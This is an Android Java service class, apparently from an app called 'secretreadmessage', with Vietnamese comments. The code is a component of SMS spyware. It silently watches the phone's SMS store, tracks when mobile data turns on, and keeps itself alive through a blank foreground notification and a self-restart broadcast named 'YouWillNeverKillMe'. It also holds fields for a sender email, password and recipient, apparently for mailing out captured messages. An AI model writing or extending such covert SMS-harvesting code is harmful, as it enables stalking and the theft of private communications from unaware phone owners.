package com.example.phamngochieu.secretreadmessage;

import android.app.IntentService;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p/>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class DelayedMessageService extends IntentService {
    public static final String MAIL_SENDER = "message";
    public static final String PASS_MAIL_SENDER = "pass";
    public static final String TITLE = "title";
    public static final String MAIL_NHAN = "mailnhan";
    DatabaseHelper startDB;
    public static SQLiteDatabase db;
    public static Handler handler;
    private static boolean STARTED = false;
    public DelayedMessageService()
    {
        super("DelayedMessageService");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        // tạo cơ sở dữ liệu
        startDB = new DatabaseHelper(this) ;
        db = startDB.getWritableDatabase();
        Log.e("tạo CSDL", "tc");


    }

    @Override
    protected void onHandleIntent(Intent intent) {
        synchronized (this){
         /*   String mail_sender = intent.getStringExtra(MAIL_SENDER);
            String pass_mail_sender = intent.getStringExtra(PASS_MAIL_SENDER);
            String title = intent.getStringExtra(TITLE);
            String mail_nhan = intent.getStringExtra(MAIL_NHAN); */
            // showText(mail_sender,pass_mail_sender,title,mail_nhan);
            // đăng ký nhận sự thay đổi SMS


        }
        Log.e("****", "đang trong onHandleIntent");

    }
    /**
     * phương thức đăng ký nhận sự thay đổi SMS
     * @param context
     */
    public void registerSmsRecieve(final Context context,final Handler handler)
    {
        Thread x = new Thread(new Runnable() {
            public void run() {
                String url = "content://sms/";
                Uri uri = Uri.parse(url);
                context.getContentResolver().registerContentObserver(uri, true, new SmsReceive(handler,context, db));
            }
        }
        );
        x.start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.e("*****","đã tạo lại service");
        Log.e("*****", "đăng ký nhận thay đổi sms");
        handler = new Handler();
        registerSmsRecieve(this, handler);
        // đăng ký lắng nghe sự kiện bật 3G
        TelephonyManager telephony;
        MyPhoneStateListener phoneListener = new MyPhoneStateListener(this);
        telephony = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(phoneListener, PhoneStateListener.LISTEN_DATA_CONNECTION_STATE);
        if (STARTED) {
            return Service.START_STICKY;
        }
        if (Build.VERSION.SDK_INT < 18) {
            startForeground(6677028, new Notification());
            this.onStart(intent, startId);
        }
        STARTED = true;
        Log.e("*****","trong onStartCommand service");
        return Service.START_STICKY;
    }

    /**
     * để gọi service dậy nếu nó bị kill
     */
    @Override
    public void onDestroy() {
        super.onDestroy();
        sendBroadcast(new Intent("YouWillNeverKillMe"));
        Log.e("*******","destroy in Service");
    }

    /*
    private void showText(final String text,final String pass,final String title,final String nhan)
    {
        Log.e("DelayedMessageService","The message is :"+ text+" "+ pass+" "+" "+title+" " +nhan);
    } */
}
